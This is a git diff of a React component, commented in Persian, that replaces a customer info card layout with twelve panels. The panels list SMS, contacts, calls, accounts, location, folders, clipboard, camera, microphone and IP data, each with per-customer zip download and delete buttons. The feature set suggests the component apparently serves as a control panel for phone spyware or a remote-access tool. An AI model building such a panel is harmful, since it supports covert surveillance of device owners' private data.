@@ -1,13 +1,73 @@
-import { useState, useEffect } from "react";
+import { useEffect, useState } from "react";
 import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
 import { Button } from "@/components/ui/button";
 import { useTheme } from "@/context/theme-context";
-import { downloadCustomerZip } from "@/lib/api";
+import {
+  downloadCustomerAllFilesZip,
+  downloadCustomerZip,
+  deleteCustomerFilesByPattern,
+} from "@/lib/api";
 import type { Customer } from "@/lib/api";
-import { 
-  User, Calendar, Clock, CreditCard, Phone, Mail, 
-  MapPin, FileIcon, Activity, Shield, Settings
+import {
+  Activity,
+  MessageCircle,
+  BookUser,
+  Phone,
+  CreditCard,
+  MapPin,
+  Folder,
+  ClipboardList,
+  Camera,
+  Mic,
+  Download,
+  Globe2,
+  Trash2,
 } from "lucide-react";
+
+const PANEL_COLORS = [
+  "bg-[rgba(255,99,132,0.24)]",
+  "bg-[rgba(54,162,235,0.19)]",
+  "bg-[rgba(255,206,86,0.22)]",
+  "bg-[rgba(75,192,192,0.18)]",
+  "bg-[rgba(153,102,255,0.21)]",
+  "bg-[rgba(255,159,64,0.23)]",
+  "bg-[rgba(222,226,230,0.25)]",
+  "bg-[rgba(255,255,255,0.3)]",
+  "bg-[rgba(80,227,194,0.19)]",
+  "bg-[rgba(52,211,153,0.22)]",
+  "bg-[rgba(120,119,198,0.20)]",
+  "bg-[rgba(56,189,248,0.19)]",
+];
+
+// اسامی ثابت و آیکون‌های هر باکس (۱۲ تایی)
+const FEATURE_KEYS = [
+  "State",
+  "Sms",
+  "Contacts",
+  "Calls",
+  "Accounts",
+  "Location",
+  "Folders",
+  "Clipboards",
+  "Camera",
+  "Microphone",
+  "IP",
+  "Download",
+];
+const FEATURE_ICONS: Record<string, any> = {
+  State: Activity,
+  Sms: MessageCircle,
+  Contacts: BookUser,
+  Calls: Phone,
+  Accounts: CreditCard,
+  Location: MapPin,
+  Folders: Folder,
+  Clipboards: ClipboardList,
+  Camera: Camera,
+  Microphone: Mic,
+  IP: Globe2,
+  Download: Download,
+};
 
 interface CustomerInfoPanelsProps {
   customer: Customer;
@@ -15,152 +75,275 @@ interface CustomerInfoPanelsProps {
 
 const CustomerInfoPanels = ({ customer }: CustomerInfoPanelsProps) => {
   const { language } = useTheme();
-  const [downloading, setDownloading] = useState(false);
-  
-  const handleDownload = async () => {
-    setDownloading(true);
-    try {
-      await downloadCustomerZip(customer.zipFileName);
-    } finally {
-      setDownloading(false);
-    }
-  };
-  
-  // Extract any additional properties to show in panels
-  const additionalProps = customer.additionalProperties || {};
-  
-  const panels = [
-    {
-      title: language === "fa" ? "اطلاعات پایه" : "Basic Info",
-      icon: User,
-      content: (
-        <div className="space-y-2">
-          <p><strong>{language === "fa" ? "نام" : "Name"}:</strong> {customer.name}</p>
-          <p><strong>ID:</strong> {customer.id}</p>
-          <p>
-            <strong>{language === "fa" ? "وضعیت" : "Status"}:</strong> 
-            <span className={
-              customer.status === "active" ? "text-green-500" : 
-              customer.status === "inactive" ? "text-red-500" : "text-yellow-500"
-            }>
-              {" "}{customer.status === "active" ? (language === "fa" ? "فعال" : "Active") : 
-                customer.status === "inactive" ? (language === "fa" ? "غیرفعال" : "Inactive") : 
-                (language === "fa" ? "در انتظار" : "Pending")}
-            </span>
-          </p>
-        </div>
-      ),
-      color: "bg-blue-100 dark:bg-blue-900/20",
-      hoverColor: "hover:bg-blue-200 dark:hover:bg-blue-800/30"
-    },
-    {
-      title: language === "fa" ? "نوع مشتری" : "Customer Type",
-      icon: Shield,
-      content: (
-        <div className="space-y-2">
-          <p className="text-xl font-bold">{additionalProps['نوع'] || customer.customerType}</p>
-        </div>
-      ),
-      color: "bg-purple-100 dark:bg-purple-900/20",
-      hoverColor: "hover:bg-purple-200 dark:hover:bg-purple-800/30"
-    },
-    {
-      title: language === "fa" ? "تاریخ ثبت" : "Registration Date",
-      icon: Calendar,
-      content: (
-        <div className="space-y-2">
-          <p className="text-xl font-bold">{additionalProps['تاریخ'] || customer.registrationDate}</p>
-        </div>
-      ),
-      color: "bg-green-100 dark:bg-green-900/20",
-      hoverColor: "hover:bg-green-200 dark:hover:bg-green-800/30"
-    },
-    {
-      title: language === "fa" ? "آخرین فعالیت" : "Last Activity",
-      icon: Clock,
-      content: (
-        <div className="space-y-2">
-          <p className="text-xl font-bold">{additionalProps['فعالیت'] || customer.lastActivity}</p>
-        </div>
-      ),
-      color: "bg-yellow-100 dark:bg-yellow-900/20",
-      hoverColor: "hover:bg-yellow-200 dark:hover:bg-yellow-800/30"
-    },
-    {
-      title: language === "fa" ? "تراکنش ها" : "Transactions",
-      icon: CreditCard,
-      content: (
-        <div className="space-y-2">
-          <p className="text-xl font-bold">{additionalProps['تراکنش'] || customer.totalTransactions}</p>
-        </div>
-      ),
-      color: "bg-red-100 dark:bg-red-900/20",
-      hoverColor: "hover:bg-red-200 dark:hover:bg-red-800/30"
-    },
-    {
-      title: language === "fa" ? "امتیاز اعتباری" : "Credit Score",
-      icon: Activity,
-      content: (
-        <div className="space-y-2">
-          <div className="w-full bg-gray-200 dark:bg-gray-700 rounded-full h-2.5">
-            <div 
-              className="bg-pistachio-500 h-2.5 rounded-full" 
-              style={{ width: `${((Number(additionalProps['امتیاز']) || customer.creditScore) / 1000) * 100}%` }}
-            ></div>
+  const [downloadingAll, setDownloadingAll] = useState(false);
+  const [downloadingIndex, setDownloadingIndex] = useState<number | null>(null);
+  const [deletingIndex, setDeletingIndex] = useState<number | null>(null);
+
+  // ویژگی‌ها (state) تا حذف و کمرنگ کردن هر ویژگی به شکل داینامیک انجام شود
+  const [properties, setProperties] = useState<Record<string, string>>(
+    customer?.additionalProperties || {}
+  );
+  // فایل کلی زیپ (state) برای مدیریت فعال/غیرفعال بودن دکمه حذف کلی
+  const [hasMainZip, setHasMainZip] = useState(false);
+
+  // بررسی وجود فایل کلی هنگام لود و هر بار تغییر customer
+  useEffect(() => {
+    const checkMainZipExists = async () => {
+      try {
+        // مسیر فایل کلی را با توجه به سرور خودت تغییر بده
+        const res = await fetch(`/uploads/${customer.id}_.zip`, { method: "HEAD" });
+        setHasMainZip(res.ok);
+      } catch {
+        setHasMainZip(false);
+      }
+    };
+    checkMainZipExists();
+  }, [customer.id]);
+
+  // panels array
+  const panels = FEATURE_KEYS.map((propertyName, idx) => {
+    const Icon = FEATURE_ICONS[propertyName] || Download;
+    const value = properties[propertyName] || "";
+    const isEmpty = !Object.prototype.hasOwnProperty.call(properties, propertyName);
+
+    // pattern برای حذف همه فایل‌های این ویژگی
+    const pattern = `${customer.id}${propertyName}*`;
+    let zipFileName = `${customer.id}${propertyName}.zip`;
+
+    // باکس آخر: Download کلی (zip همه فایل‌ها)
+    if (propertyName === "Download") {
+      const mainZipPattern = `${customer.id}_*.zip`;
+      // حالت باکس دانلود کلی
+      return {
+        icon: Download,
+        title: "Download",
+        isEmpty: !hasMainZip,
+        content: (
+          <div className="flex flex-col items-center justify-center min-h-[60px] py-4">
+            <div className="flex flex-row justify-center items-center gap-6">
+              <Button
+                size="icon"
+                variant="ghost"
+                style={{
+                  color: "#22c55e", // سبز
+                  background: "transparent",
+                }}
+                title={
+                  hasMainZip
+                    ? "Download all customer files"
+                    : "فایلی برای دانلود وجود ندارد"
+                }
+                disabled={downloadingAll || deletingIndex === idx || !hasMainZip}
+                onClick={async () => {
+                  if (!hasMainZip) return;
+                  setDownloadingAll(true);
+                  try {
+                    await downloadCustomerAllFilesZip(customer.id);
+                  } finally {
+                    setDownloadingAll(false);
+                  }
+                }}
+              >
+                <Download className="w-8 h-8" />
+              </Button>
+              <Button
+                size="icon"
+                variant="ghost"
+                style={{
+                  color: "#ef4444", // قرمز ملایم
+                  background: "transparent",
+                }}
+                title={
+                  hasMainZip
+                    ? "Delete main zip file"
+                    : "فایل کلی برای حذف وجود ندارد"
+                }
+                disabled={deletingIndex === idx || downloadingAll || !hasMainZip}
+                onClick={async () => {
+                  if (!hasMainZip) return;
+                  if (
+                    window.confirm(
+                      "Are you sure you want to delete the main zip file for this customer?"
+                    )
+                  ) {
+                    setDeletingIndex(idx);
+                    try {
+                      const result = await deleteCustomerFilesByPattern(mainZipPattern);
+                      alert(result);
+                      setHasMainZip(false);
+                      // اگر همه ویژگی‌ها خالی بود صفحه را رفرش کن
+                      if (
+                        !FEATURE_KEYS.slice(0, 11).some((key) =>
+                          Object.prototype.hasOwnProperty.call(properties, key)
+                        )
+                      ) {
+                        setTimeout(() => {
+                          window.location.reload();
+                        }, 700);
+                      }
+                    } catch (err: any) {
+                      alert(
+                        "Error deleting main zip file: " +
+                          (err?.message || err)
+                      );
+                    } finally {
+                      setDeletingIndex(null);
+                    }
+                  }
+                }}
+              >
+                <Trash2 className="w-8 h-8" />
+              </Button>
+            </div>
           </div>
-          <p className="text-xl font-bold">{additionalProps['امتیاز'] || customer.creditScore}</p>
-        </div>
-      ),
-      color: "bg-indigo-100 dark:bg-indigo-900/20",
-      hoverColor: "hover:bg-indigo-200 dark:hover:bg-indigo-800/30"
-    },
-    {
-      title: language === "fa" ? "اطلاعات تماس" : "Contact Info",
-      icon: Phone,
+        ),
+      };
+    }
+
+    // سایر باکس‌ها
+    return {
+      icon: Icon,
+      title: propertyName,
+      isEmpty,
       content: (
-        <div className="space-y-2 text-sm">
-          <p className="flex items-center">
-            <Mail className="h-4 w-4 mr-1" /> {additionalProps['ایمیل'] || customer.contactInfo.email}
+        <div className="flex flex-col min-h-[60px] justify-between">
+          <p
+            className={`text-lg font-vazir ${
+              isEmpty ? "text-gray-400 italic" : "font-medium text-black"
+            }`}
+          >
+            {value}
           </p>
-          <p className="flex items-center">
-            <Phone className="h-4 w-4 mr-1" /> {additionalProps['تلفن'] || customer.contactInfo.phone}
-          </p>
+          <div className="flex justify-end mt-2 gap-2">
+            <Button
+              size="icon"
+              variant="ghost"
+              className={isEmpty ? "!p-1 opacity-50 cursor-not-allowed" : "!p-1"}
+              title={
+                language === "fa"
+                  ? "دانلود فایل این ویژگی"
+                  : "Download this property file"
+              }
+              onClick={async () => {
+                if (isEmpty) return;
+                setDownloadingIndex(idx);
+                try {
+                  await downloadCustomerZip(zipFileName);
+                } finally {
+                  setDownloadingIndex(null);
+                }
+              }}
+              disabled={downloadingIndex === idx || isEmpty}
+            >
+              <Download className="w-5 h-5" />
+            </Button>
+            <Button
+              size="icon"
+              variant="ghost"
+              style={{
+                color: "#ef4444",
+                background: "transparent",
+              }}
+              className={isEmpty ? "!p-1 opacity-50 cursor-not-allowed" : "!p-1"}
+              title={
+                language === "fa"
+                  ? "حذف فایل این ویژگی"
+                  : "Delete this property file"
+              }
+              onClick={async () => {
+                if (isEmpty) return;
+                if (
+                  window.confirm(
+                    language === "fa"
+                      ? `آیا مطمئن هستید که می‌خواهید همه فایل‌های ویژگی "${propertyName}" این مشتری را حذف کنید؟`
+                      : `Are you sure you want to delete all files for property "${propertyName}"?`
+                  )
+                ) {
+                  setDeletingIndex(idx);
+                  try {
+                    const result = await deleteCustomerFilesByPattern(pattern);
+                    alert(result);
+                    // فقط این ویژگی را از state حذف کن تا کمرنگ و غیرفعال شود
+                    setProperties((prev) => {
+                      const newProps = { ...prev };
+                      delete newProps[propertyName];
+                      return newProps;
+                    });
+                    // اگر همه ویژگی‌ها خالی بود و فایل کلی نبود صفحه را رفرش کن
+                    if (
+                      !hasMainZip &&
+                      !FEATURE_KEYS.slice(0, 11).some((key) =>
+                        Object.prototype.hasOwnProperty.call(
+                          { ...properties, [propertyName]: undefined },
+                          key
+                        )
+                      )
+                    ) {
+                      setTimeout(() => {
+                        window.location.reload();
+                      }, 700);
+                    }
+                  } catch (err: any) {
+                    alert(
+                      (language === "fa"
+                        ? "خطا در حذف فایل‌ها: "
+                        : "Error deleting files: ") +
+                        (err?.message || err)
+                    );
+                  } finally {
+                    setDeletingIndex(null);
+                  }
+                }
+              }}
+              disabled={deletingIndex === idx || isEmpty}
+            >
+              <Trash2 className="w-5 h-5" />
+            </Button>
+          </div>
         </div>
       ),
-      color: "bg-pink-100 dark:bg-pink-900/20",
-      hoverColor: "hover:bg-pink-200 dark:hover:bg-pink-800/30"
-    },
-    {
-      title: language === "fa" ? "آدرس" : "Address",
-      icon: MapPin,
-      content: (
-        <div className="space-y-2">
-          <p className="text-sm">{additionalProps['آدرس'] || customer.contactInfo.address}</p>
-        </div>
-      ),
-      color: "bg-orange-100 dark:bg-orange-900/20",
-      hoverColor: "hover:bg-orange-200 dark:hover:bg-orange-800/30"
-    },
-  ];
+    };
+  });
 
   return (
-    <div className="grid grid-cols-1 md:grid-cols-3 gap-4 animate-fade-in">
-      {panels.map((panel, index) => (
-        <Card 
-          key={index} 
-          className={`glass-morphism transition-all ${panel.color} ${panel.hoverColor} shadow-md hover:shadow-lg transform hover:-translate-y-1 duration-300`}
-        >
-          <CardHeader className="pb-2">
-            <CardTitle className="flex items-center text-lg">
-              <panel.icon className="mr-2 h-5 w-5" />
-              {panel.title}
-            </CardTitle>
-          </CardHeader>
-          <CardContent>
-            {panel.content}
-          </CardContent>
-        </Card>
-      ))}
+    <div className="flex justify-center items-center w-full font-vazir">
+      <div className="grid grid-cols-1 md:grid-cols-3 gap-6 max-w-5xl w-full">
+        {panels.map((panel, index) => (
+          <Card
+            key={index}
+            className={`
+              ${PANEL_COLORS[index]}
+              shadow-2xl
+              transition-all
+              hover:shadow-2xl
+              transform
+              hover:-translate-y-1
+              duration-300
+              min-h-[130px]
+              flex flex-col justify-between
+              border-none
+              rounded-2xl
+              backdrop-blur-[2.5px]
+              font-vazir
+            `}
+            style={{
+              color: "#1a1a1a",
+            }}
+          >
+            <CardHeader className="pb-2">
+              <CardTitle
+                className={`flex items-center text-base font-semibold font-vazir tracking-tight ${
+                  panel.isEmpty ? "text-gray-400 italic" : "text-black"
+                }`}
+              >
+                <panel.icon className="mr-2 h-5 w-5" />
+                {panel.title}
+              </CardTitle>
+            </CardHeader>
+            <CardContent>{panel.content}</CardContent>
+          </Card>
+        ))}
+      </div>
     </div>
   );
 };
